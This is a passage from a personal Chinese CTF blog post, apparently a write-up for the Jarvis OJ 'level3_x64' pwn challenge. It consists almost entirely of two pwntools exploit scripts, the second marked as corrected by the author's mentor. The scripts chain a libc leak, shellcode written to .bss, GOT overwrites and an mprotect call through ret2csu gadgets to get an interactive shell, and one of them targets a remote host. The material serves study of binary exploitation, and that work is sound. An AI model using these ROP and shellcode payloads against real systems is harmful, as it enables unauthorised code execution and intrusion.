+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"># io = remote(&quot;pwn2.jarvisoj.com&quot;, 9884)</span><br><span class="line">io = process(&quot;./level3_x64&quot;)</span><br><span class="line">libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line">elf = ELF(&quot;./level3_x64&quot;)</span><br><span class="line"></span><br><span class="line">rop1 = 0x00000000004006AA		#pop_rbx_rbp_r12_r13_r14_r15</span><br><span class="line">rop2 = 0x0000000000400690		#mov rdx,r13;; mov rsi,r14;; mov edi,r15d</span><br><span class="line">bss_addr = 0x0000000000600A88</span><br><span class="line">main_addr = 0x000000000040061A</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">vul_addr = elf.symbols[&quot;vulnerable_function&quot;]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;=======leak=======&quot;</span><br><span class="line">payload1  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(read_got) + &quot;a&quot; * 8 + p64(write_plt)		#write(1, read_got, 8)</span><br><span class="line">payload1 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(io.recv()[0:8])</span><br><span class="line">print &quot;read_addr ==&gt; &quot;+hex(read_addr) </span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.symbols[&quot;read&quot;]</span><br><span class="line">mprotect_addr = libc_base + libc.symbols[&quot;mprotect&quot;]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;=======read shellcode to bss======&quot;</span><br><span class="line">pause()</span><br><span class="line">payload2  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_addr) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload2 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(),arch=&apos;amd64&apos;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;======write bss to got======&quot;</span><br><span class="line">pause()</span><br><span class="line">bss_got = 0x600A48</span><br><span class="line">payload3  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload3 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.sendline(p64(bss_addr))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;======write mprotect to got======&quot;</span><br><span class="line">pause()</span><br><span class="line">mprotect_got = 0x600A50</span><br><span class="line">payload4  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload4 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_addr) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload4 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload4)</span><br><span class="line">io.sendline(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;====== end ======&quot;</span><br><span class="line">pause()</span><br><span class="line">payload5  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(rop1) + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(0) + p64(1) + p64(mprotect_got) + p64(7) + p64(0x1000) + p64(0x600000)</span><br><span class="line">	        #rbx     #rbp     #r12                #r13     #r14          #r15</span><br><span class="line">					                              #rdx     #rsi          #edi</span><br><span class="line">payload5 += p64(rop2) + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">	        #rbx     #rbp     #r12           #r13     #r14     #r15</span><br><span class="line">				                             #rdx     #rsi     #edi</span><br><span class="line">payload5 += p64(rop2)</span><br><span class="line"></span><br><span class="line">io.sendline(payload5)</span><br><span class="line">sleep(5)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>【8.13更正】师父帮我改的555</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io = remote(&quot;pwn2.jarvisoj.com&quot;, 9884)</span><br><span class="line">libc = ELF(&quot;./libc-2.19.so&quot;)</span><br><span class="line">elf = ELF(&quot;./level3_x64&quot;)</span><br><span class="line"></span><br><span class="line">rop1 = 0x00000000004006A6       #pop_rbx_rbp_r12_r13_r14_r15</span><br><span class="line">rop2 = 0x0000000000400690       #mov rdx,r13;; mov rsi,r14;; mov edi,r15d</span><br><span class="line">bss_addr = 0x0000000000600A88</span><br><span class="line">main_addr = 0x000000000040061A</span><br><span class="line">pop_rdi_ret = 0x00000000004006b3</span><br><span class="line">pop_rsi_r15_ret = 0x00000000004006b1</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">vul_addr = elf.symbols[&quot;vulnerable_function&quot;]</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;=======leak=======&quot;</span><br><span class="line">payload1  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(read_got) + &quot;a&quot; * 8 + p64(write_plt)     #write(1, read_got, 8)</span><br><span class="line">payload1 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(io.recvn(8))</span><br><span class="line">libc_base = read_addr - libc.symbols[&quot;read&quot;]</span><br><span class="line">mprotect_addr = libc_base + libc.symbols[&quot;mprotect&quot;]</span><br><span class="line"></span><br><span class="line">print &quot;read_addr ==&gt; &quot;+hex(read_addr) </span><br><span class="line">print &quot;libc_base ==&gt; &quot;+hex(libc_base) </span><br><span class="line">print &quot;mprotect_addr ==&gt; &quot;+hex(mprotect_addr) </span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;=======read shellcode to bss======&quot;</span><br><span class="line">payload2  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_addr) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload2 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch=&quot;amd64&quot;)</span><br><span class="line">io.send(shellcode)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;======write bss to got======&quot;</span><br><span class="line">bss_got = elf.got[&quot;__libc_start_main&quot;]</span><br><span class="line">payload3  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload3 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">print &quot;======write mprotect to got======&quot;</span><br><span class="line">mprotect_got = elf.got[&quot;__gmon_start__&quot;]</span><br><span class="line">payload4  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8 </span><br><span class="line">payload4 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got) + &quot;a&quot; * 8 + p64(read_plt)</span><br><span class="line">payload4 += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload4)</span><br><span class="line">io.sendline(p64(mprotect_addr))</span><br><span class="line"></span><br><span class="line">print &quot;====== end ======&quot;</span><br><span class="line">payload5  = &quot;a&quot; * 0x80 + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(rop1) + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(0) + p64(1)  + p64(mprotect_got) + p64(7) + p64(0x1000) + p64(0x600000)</span><br><span class="line">            #rbx     #rbp     #r12                #r13     #r14          #r15</span><br><span class="line">                                                  #rdx     #rsi          #edi</span><br><span class="line">payload5 += p64(rop2) + &quot;a&quot; * 8</span><br><span class="line">payload5 += p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)</span><br><span class="line">            #rbx     #rbp     #r12                #r13     #r14          #r15</span><br><span class="line">                                                  #rdx     #rsi          #edi</span><br><span class="line">payload5 += p64(rop2)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload5)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/oj/">oj</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/pwn/">pwn</a><a href="/tags/wp/">wp</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/10/03/buu/wppp/" title="buuctf pwn wp【长期更】">
+  <span>
+  buuctf pwn wp【长期更】</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/10/03/keypatch/keypatch/"  title="IDA插件keypatch初体验">
+ <span>IDA插件keypatch初体验
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		<a href="http://weibo.com/https://weibo.com/u/5213203661?refer_flag=0000015010_&amp;from=feed&amp;loc=nickname" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		<a href="https://github.com/https://github.com/p1Kk" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:p1kk_wang@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/oj/" title="oj">oj<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/笔记/" title="笔记">笔记<sup>4</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wp/" title="wp">wp<sup>8</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻防世界/" title="攻防世界">攻防世界<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ubuntu18/" title="ubuntu18">ubuntu18<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/C/" title="C++">C++<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="link1's url" target="_blank" title="link1&#39;s name">link1&#39;s name</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2019 
+		
+		<a href="/about" target="_blank" title="p1Kk">p1Kk</a>
+		
+		
+		</p>
+</div>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_uv"> 
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span></footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
